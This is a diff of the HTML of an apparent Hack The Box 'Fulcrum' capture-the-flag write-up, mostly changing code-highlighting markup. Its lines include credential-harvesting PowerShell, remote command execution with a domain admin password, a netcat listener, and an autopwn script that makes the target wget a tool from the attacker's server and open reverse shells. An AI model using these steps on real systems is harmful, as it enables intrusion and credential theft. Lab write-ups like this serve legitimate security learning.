-<div class="bg-ps"><div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">PS</span> <span class="n">webserver</span><span class="p">\</span><span class="n">webuser</span><span class="nv">@WEBSERVER</span> <span class="n">wwwroot</span><span class="p">&gt;</span> <span class="nb">Invoke-Command</span> <span class="n">-ComputerName</span> <span class="n">file</span><span class="p">.</span><span class="n">fulcrum</span><span class="p">.</span><span class="n">local</span> <span class="n">-Credential</span> <span class="n">fulcrum</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">btables</span> <span class="n">-Port</span> <span class="n">5985</span> <span class="n">-ScriptBlock</span> <span class="p">{</span> <span class="n">type</span> <span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Btables</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">user</span><span class="p">.</span><span class="n">txt</span> <span class="p">}</span>
+<div class="bg-ps"><div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">PS </span><span class="n">webserver</span><span class="p">\</span><span class="n">webuser</span><span class="nv">@WEBSERVER</span> <span class="n">wwwroot</span><span class="p">&gt;</span> <span class="nb">Invoke-Command</span> <span class="n">-ComputerName</span> <span class="n">file</span><span class="p">.</span><span class="n">fulcrum</span><span class="p">.</span><span class="n">local</span> <span class="n">-Credential</span> <span class="n">fulcrum</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">btables</span> <span class="n">-Port</span> <span class="n">5985</span> <span class="n">-ScriptBlock</span> <span class="p">{</span> <span class="nb">type </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Btables</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">user</span><span class="p">.</span><span class="n">txt</span> <span class="p">}</span>
 
 <span class="n">fce52521c8f872b514f037fada78daf4</span></code></pre></div></div></p>
 
@@ -623,19 +623,19 @@ PS webserver\webuser@WEBSERVER Documents&gt;</code></pre></div></div>
 <span class="k">end</span></code></pre></div></p>
 
 <p>Don&rsquo;t forget the listener:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo nc -lvp 53
-...</code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sudo nc -lvp 53
+...</code></pre></div></p>
 
 <h1 id="privilege-escalation">Privilege Escalation</h1>
 
 <p>Now we have a shell on the file server. We can use our credentials to get access on the netlogon share on the DC:
-<div class="bg-ps"><div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">PS</span> <span class="n">fulcrum</span><span class="p">\</span><span class="n">btables</span><span class="nv">@FILE</span> <span class="n">Documents</span><span class="p">&gt;</span> <span class="n">net</span> <span class="n">use</span> <span class="p">\\</span><span class="n">dc</span><span class="p">.</span><span class="n">fulcrum</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">netlogon</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">fulcrum</span><span class="p">\</span><span class="n">btables</span> <span class="p">++</span><span class="n">FileServerLogon12345</span><span class="p">++</span>
+<div class="bg-ps"><div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">PS </span><span class="n">fulcrum</span><span class="p">\</span><span class="n">btables</span><span class="nv">@FILE</span> <span class="n">Documents</span><span class="p">&gt;</span> <span class="n">net</span> <span class="n">use</span> <span class="p">\\</span><span class="n">dc</span><span class="p">.</span><span class="n">fulcrum</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">netlogon</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">fulcrum</span><span class="p">\</span><span class="n">btables</span> <span class="p">++</span><span class="n">FileServerLogon12345</span><span class="p">++</span>
 <span class="n">The</span> <span class="n">command</span> <span class="n">completed</span> <span class="n">successfully</span><span class="p">.</span>
-<span class="n">PS</span> <span class="n">fulcrum</span><span class="p">\</span><span class="n">btables</span><span class="nv">@FILE</span> <span class="n">Documents</span><span class="p">&gt;</span> <span class="n">cd</span> <span class="p">\\</span><span class="n">dc</span><span class="p">.</span><span class="n">fulcrum</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">netlogon</span>
-<span class="n">PS</span> <span class="n">fulcrum</span><span class="p">\</span><span class="n">btables</span><span class="nv">@FILE</span> <span class="n">netlogon</span><span class="p">&gt;</span></code></pre></div></div></p>
+<span class="nb">PS </span><span class="n">fulcrum</span><span class="p">\</span><span class="n">btables</span><span class="nv">@FILE</span> <span class="n">Documents</span><span class="p">&gt;</span> <span class="nb">cd </span><span class="p">\\</span><span class="n">dc</span><span class="p">.</span><span class="n">fulcrum</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">netlogon</span>
+<span class="nb">PS </span><span class="n">fulcrum</span><span class="p">\</span><span class="n">btables</span><span class="nv">@FILE</span> <span class="n">netlogon</span><span class="p">&gt;</span></code></pre></div></div></p>
 
 <p>Here we find several interesting scripts like this one for example:
-<div class="bg-ps"><div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">PS</span> <span class="n">fulcrum</span><span class="p">\</span><span class="n">btables</span><span class="nv">@FILE</span> <span class="n">netlogon</span><span class="p">&gt;</span>  <span class="n">cat</span> <span class="n">a1a41e90</span><span class="p">-</span><span class="n">147b</span><span class="p">-</span><span class="n">44c9</span><span class="p">-</span><span class="n">97d7-c9abb5ec0e2a</span><span class="p">.</span><span class="n">ps1</span>
+<div class="bg-ps"><div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">PS </span><span class="n">fulcrum</span><span class="p">\</span><span class="n">btables</span><span class="nv">@FILE</span> <span class="n">netlogon</span><span class="p">&gt;</span>  <span class="nb">cat </span><span class="n">a1a41e90</span><span class="p">-</span><span class="n">147b</span><span class="p">-</span><span class="n">44c9</span><span class="p">-</span><span class="n">97d7-c9abb5ec0e2a</span><span class="p">.</span><span class="n">ps1</span>
 
 <span class="c"># Map network drive v1.0</span>
 <span class="nv">$User</span> <span class="p">=</span> <span class="s1">&#39;923a&#39;</span>
@@ -654,17 +654,17 @@ PS webserver\webuser@WEBSERVER Documents&gt;</code></pre></div></div>
     <span class="nv">$user</span> <span class="p">=</span> <span class="nv">$result</span><span class="p">.</span><span class="n">Matches</span><span class="p">[</span><span class="n">0</span><span class="p">].</span><span class="n">Groups</span><span class="p">[</span><span class="n">1</span><span class="p">].</span><span class="n">Value</span><span class="p">;</span>
     <span class="nv">$pass</span> <span class="p">=</span> <span class="nv">$result</span><span class="p">.</span><span class="n">Matches</span><span class="p">[</span><span class="n">1</span><span class="p">].</span><span class="n">Groups</span><span class="p">[</span><span class="n">1</span><span class="p">].</span><span class="n">Value</span><span class="p">;</span>
     <span class="k">if</span> <span class="p">(</span><span class="n">test</span> <span class="s2">&#34;fulcrum.local\$user&#34;</span> <span class="s2">&#34;$pass&#34;</span><span class="p">))</span> <span class="p">{</span>
-        <span class="n">echo</span> <span class="s2">&#34;fulcrum.local\$user $pass&#34;</span><span class="p">;</span>
+        <span class="nb">echo </span><span class="s2">&#34;fulcrum.local\$user $pass&#34;</span><span class="p">;</span>
     <span class="p">}</span>
 <span class="p">}</span></code></pre></div></div></p>
 
 <p>We convert it to one-liner and run it:
-<div class="bg-ps"><div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">PS</span> <span class="n">fulcrum</span><span class="p">\</span><span class="n">btables</span><span class="nv">@FILE</span> <span class="n">netlogon</span><span class="p">&gt;</span> <span class="k">function</span> <span class="n">test</span><span class="p">(</span><span class="nv">$u</span><span class="p">,</span><span class="nv">$p</span><span class="p">)</span> <span class="p">{</span> <span class="p">(</span><span class="nb">new-object</span> <span class="n">directoryservices</span><span class="p">.</span><span class="n">directoryentry</span> <span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">$u</span><span class="p">,</span><span class="nv">$p</span><span class="p">).</span><span class="n">psbase</span><span class="p">.</span><span class="n">name</span> <span class="o">-ne</span> <span class="nv">$null</span><span class="p">;</span> <span class="p">};</span> <span class="nv">$files</span> <span class="p">=</span> <span class="p">@(</span><span class="n">gci</span> <span class="p">\\</span><span class="n">dc</span><span class="p">.</span><span class="n">fulcrum</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">netlogon</span><span class="p">\*.</span><span class="n">ps1</span><span class="p">);</span> <span class="k">foreach</span> <span class="p">(</span><span class="nv">$file</span> <span class="k">in</span> <span class="nv">$files</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$result</span> <span class="p">=</span> <span class="nb">Select-String</span> <span class="n">-Path</span> <span class="nv">$file</span> <span class="n">-pattern</span> <span class="s2">&#34;&#39;(.*)&#39;&#34;</span><span class="p">;</span> <span class="nv">$user</span> <span class="p">=</span> <span class="nv">$result</span><span class="p">.</span><span class="n">Matches</span><span class="p">[</span><span class="n">0</span><span class="p">].</span><span class="n">Groups</span><span class="p">[</span><span class="n">1</span><span class="p">].</span><span class="n">Value</span><span class="p">;</span> <span class="nv">$pass</span> <span class="p">=</span> <span class="nv">$result</span><span class="p">.</span><span class="n">Matches</span><span class="p">[</span><span class="n">1</span><span class="p">].</span><span class="n">Groups</span><span class="p">[</span><span class="n">1</span><span class="p">].</span><span class="n">Value</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span><span class="n">test</span> <span class="s2">&#34;fulcrum.local\$user&#34;</span> <span class="s2">&#34;$pass&#34;</span><span class="p">)</span> <span class="p">{</span> <span class="n">echo</span> <span class="s2">&#34;fulcrum.local\$user $pass&#34;</span><span class="p">;</span> <span class="p">};</span> <span class="p">}</span>
+<div class="bg-ps"><div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">PS </span><span class="n">fulcrum</span><span class="p">\</span><span class="n">btables</span><span class="nv">@FILE</span> <span class="n">netlogon</span><span class="p">&gt;</span> <span class="k">function</span> <span class="n">test</span><span class="p">(</span><span class="nv">$u</span><span class="p">,</span><span class="nv">$p</span><span class="p">)</span> <span class="p">{</span> <span class="p">(</span><span class="nb">new-object</span> <span class="n">directoryservices</span><span class="p">.</span><span class="n">directoryentry</span> <span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">$u</span><span class="p">,</span><span class="nv">$p</span><span class="p">).</span><span class="n">psbase</span><span class="p">.</span><span class="n">name</span> <span class="o">-ne</span> <span class="nv">$null</span><span class="p">;</span> <span class="p">};</span> <span class="nv">$files</span> <span class="p">=</span> <span class="p">@(</span><span class="nb">gci </span><span class="p">\\</span><span class="n">dc</span><span class="p">.</span><span class="n">fulcrum</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">netlogon</span><span class="p">\*.</span><span class="n">ps1</span><span class="p">);</span> <span class="k">foreach</span> <span class="p">(</span><span class="nv">$file</span> <span class="k">in</span> <span class="nv">$files</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$result</span> <span class="p">=</span> <span class="nb">Select-String</span> <span class="n">-Path</span> <span class="nv">$file</span> <span class="n">-pattern</span> <span class="s2">&#34;&#39;(.*)&#39;&#34;</span><span class="p">;</span> <span class="nv">$user</span> <span class="p">=</span> <span class="nv">$result</span><span class="p">.</span><span class="n">Matches</span><span class="p">[</span><span class="n">0</span><span class="p">].</span><span class="n">Groups</span><span class="p">[</span><span class="n">1</span><span class="p">].</span><span class="n">Value</span><span class="p">;</span> <span class="nv">$pass</span> <span class="p">=</span> <span class="nv">$result</span><span class="p">.</span><span class="n">Matches</span><span class="p">[</span><span class="n">1</span><span class="p">].</span><span class="n">Groups</span><span class="p">[</span><span class="n">1</span><span class="p">].</span><span class="n">Value</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span><span class="n">test</span> <span class="s2">&#34;fulcrum.local\$user&#34;</span> <span class="s2">&#34;$pass&#34;</span><span class="p">)</span> <span class="p">{</span> <span class="nb">echo </span><span class="s2">&#34;fulcrum.local\$user $pass&#34;</span><span class="p">;</span> <span class="p">};</span> <span class="p">}</span>
 
 <span class="n">fulcrum</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">923a</span> <span class="nv">@fulcrum_bf392748ef4e_</span><span class="p">$</span></code></pre></div></div></p>
 
 <p>Now we have the domain admin credentials. Let&rsquo;s get the root flag:
-<div class="bg-ps"><div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">PS</span> <span class="n">fulcrum</span><span class="p">\</span><span class="n">btables</span><span class="nv">@FILE</span> <span class="n">netlogon</span><span class="p">&gt;</span> <span class="nv">$pass</span> <span class="p">=</span> <span class="nb">convertto-securestring</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span> <span class="n">-String</span> <span class="s1">&#39;@fulcrum_bf392748ef4e_$&#39;</span><span class="p">;</span> <span class="nv">$cred</span> <span class="p">=</span> <span class="nb">new-object</span> <span class="n">-typename</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span> <span class="n">-argumentlist</span> <span class="s1">&#39;fulcrum.local\923a&#39;</span><span class="p">,</span><span class="nv">$pass</span><span class="p">;</span> <span class="nb">Invoke-Command</span> <span class="n">-ComputerName</span> <span class="n">dc</span><span class="p">.</span><span class="n">fulcrum</span><span class="p">.</span><span class="n">local</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="n">-Port</span> <span class="n">5985</span> <span class="n">-ScriptBlock</span> <span class="p">{</span> <span class="n">cat</span> <span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">root</span><span class="p">.</span><span class="n">txt</span> <span class="p">}</span>
+<div class="bg-ps"><div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">PS </span><span class="n">fulcrum</span><span class="p">\</span><span class="n">btables</span><span class="nv">@FILE</span> <span class="n">netlogon</span><span class="p">&gt;</span> <span class="nv">$pass</span> <span class="p">=</span> <span class="nb">convertto-securestring</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span> <span class="n">-String</span> <span class="s1">&#39;@fulcrum_bf392748ef4e_$&#39;</span><span class="p">;</span> <span class="nv">$cred</span> <span class="p">=</span> <span class="nb">new-object</span> <span class="n">-typename</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span> <span class="n">-argumentlist</span> <span class="s1">&#39;fulcrum.local\923a&#39;</span><span class="p">,</span><span class="nv">$pass</span><span class="p">;</span> <span class="nb">Invoke-Command</span> <span class="n">-ComputerName</span> <span class="n">dc</span><span class="p">.</span><span class="n">fulcrum</span><span class="p">.</span><span class="n">local</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="n">-Port</span> <span class="n">5985</span> <span class="n">-ScriptBlock</span> <span class="p">{</span> <span class="nb">cat </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">root</span><span class="p">.</span><span class="n">txt</span> <span class="p">}</span>
 
 <span class="n">8ddbe372e57c019bb6c4cdb5b35a0cab</span></code></pre></div></div></p>
 
@@ -764,7 +764,7 @@ PS webserver\webuser@WEBSERVER Documents&gt;</code></pre></div></div>
     <span class="n">phpshell</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="n">LPORT</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">TIMEOUT</span><span class="p">)</span><span class="o">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
     <span class="k">if</span> <span class="n">phpshell</span><span class="o">.</span><span class="n">sock</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
         <span class="n">log</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="s2">&#34;Connection timeout.&#34;</span><span class="p">)</span>
-        <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">()</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
     <span class="n">phpshell</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;cd /dev/shm&#34;</span><span class="p">)</span>
     <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Uploading socat for port redirection&#34;</span><span class="p">)</span>
     <span class="n">phpshell</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;wget http://&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">SRVHOST</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;:&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">SRVPORT</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;/socat&#34;</span><span class="p">)</span>
@@ -778,7 +778,7 @@ PS webserver\webuser@WEBSERVER Documents&gt;</code></pre></div></div>
     <span class="n">Popen</span><span class="p">([</span><span class="s2">&#34;ruby&#34;</span><span class="p">,</span> <span class="s2">&#34;ruby_helper.rb&#34;</span><span class="p">])</span>
     <span class="n">pssh</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="n">LPORT2</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">TIMEOUT</span><span class="p">)</span><span class="o">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
     <span class="n">pssh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-    <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">()</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
 <span class="k">except</span> <span class="p">(</span><span class="ne">KeyboardInterrupt</span><span class="p">,</span> <span class="ne">SystemExit</span><span class="p">):</span>
     <span class="n">th1</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
     <span class="n">th2</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
@@ -786,7 +786,7 @@ PS webserver\webuser@WEBSERVER Documents&gt;</code></pre></div></div>
     <span class="n">log</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span></code></pre></div>
 
 <p>Let&rsquo;s run it:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo python2 autopwn_fulcrum.py 
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sudo python2 autopwn_fulcrum.py 
 [*] Serving payload at port 60000
 [*] Sending php shell payload...
 [+] Trying to bind to 0.0.0.0 on port 60001: Done
@@ -800,7 +800,7 @@ PS webserver\webuser@WEBSERVER Documents&gt;</code></pre></div></div>
 [*] Switching to interactive mode
 $ whoami
 fulcrum\923a
-PS fulcrum\923a@FILE Documents&gt;</code></pre></div></div></p>
+PS fulcrum\923a@FILE Documents&gt;</code></pre></div></p>
 
         </div>
 
@@ -838,38 +838,6 @@ PS fulcrum\923a@FILE Documents&gt;</code></pre></div></div></p>
            
            
            
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">LaCasaDePapel write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">27 Jul 2019</time>
-      <time lang="el">27 Ιουλ 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
             <article class="li col-sm-6 col-md-4">
   <a href="https://alamot.github.io/falafel_writeup/" class="clearfix">
     <div class="cell">
@@ -885,694 +853,6 @@ PS fulcrum\923a@FILE Documents&gt;</code></pre></div></div></p>
   </a>
 </article>
 
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/nl80211/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/wifi-sign.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">How to get info for the wireless interface using nl80211 in C</h3>
-      <h3 class="title" lang="el">Πως να λάβετε πληροφορίες για την ασύρματη διεπαφή χρησιμοποιώντας την nl80211 στη C</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">09 Oct 2016</time>
-      <time lang="el">09 Οκτ 2016</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/querier_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/querier.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Querier write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Querier</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">22 Jun 2019</time>
-      <time lang="el">22 Ιουν 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fluxcapacitor_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">FluxCapacitor write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του FluxCapacitor</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">13 May 2018</time>
-      <time lang="el">13 Μαϊ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/rold/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/rold.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Retriever of Lost Dreams</h3>
-      <h3 class="title" lang="el">Ο Ιχνηλάτης των Χαμένων Ονείρων</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">16 Aug 2015</time>
-      <time lang="el">16 Αυγ 2015</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/shutdown_manager_transparent/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/transparent_shutdown.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Creation of a transparent shutdown GUI using Gtk and Cairo in Python</h3>
-      <h3 class="title" lang="el">Δημιουργία μιας διαφανούς γραφικής διεπαφής κλεισίματος με τη χρήση Gtk και Cairo σε Python</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">19 Sep 2016</time>
-      <time lang="el">19 Σεπ 2016</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fortune_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/fortune.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Fortune write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Fortune</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">02 Aug 2019</time>
-      <time lang="el">02 Αυγ 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/sense_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/pfsense.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Sense write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Sense</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">24 Mar 2018</time>
-      <time lang="el">24 Μαρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/enterprise_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/space.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Enterprise write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Enterprise</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">19 Mar 2018</time>
-      <time lang="el">19 Μαρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Minion write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Minion</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">10 Apr 2018</time>
-      <time lang="el">10 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/tally_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Tally write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Tally</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">03 May 2018</time>
-      <time lang="el">03 Μαϊ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Legacy write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">19 Oct 2017</time>
-      <time lang="el">19 Οκτ 2017</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/nineveh_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/nineveh.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Nineveh write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Nineveh</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">17 Dec 2017</time>
-      <time lang="el">17 Δεκ 2017</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/mantis_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/mantis.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Mantis write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Mantis</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">18 Feb 2018</time>
-      <time lang="el">18 Φεβ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Optimum write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">28 Oct 2017</time>
-      <time lang="el">28 Οκτ 2017</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
